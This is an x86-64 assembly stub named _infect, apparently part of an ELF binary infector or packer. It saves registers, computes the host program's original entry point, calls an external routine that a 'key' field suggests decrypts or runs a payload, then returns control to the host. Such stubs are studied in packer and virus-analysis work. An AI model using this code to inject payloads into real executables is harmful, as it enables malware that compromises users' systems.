section .textstart
global _infect
global size
global memaddr
global text_start
global text_length
global key
extern entry

_infect:
	push rax
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi
	push rbp
	push rsp
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push r15
	pushf

jmp begin
diff: db `00000000`
memaddr: db `00000000`
size: db `00000000`
text_start: db `00000000`
text_length: db `00000000`
key: db `0000000000000000`

begin:
	mov r14, QWORD[rel diff]
	lea rax, [rel _infect]
	sub rax, r14
	mov r14, rax

	mov r13, QWORD[rel text_start]
	lea rax, [rel _infect]
	sub rax, r13
	mov r13, rax
	mov QWORD[rel text_start], r13

	call entry

	popf
	pop r15
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rsp
	pop rbp
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax

	jmp r14
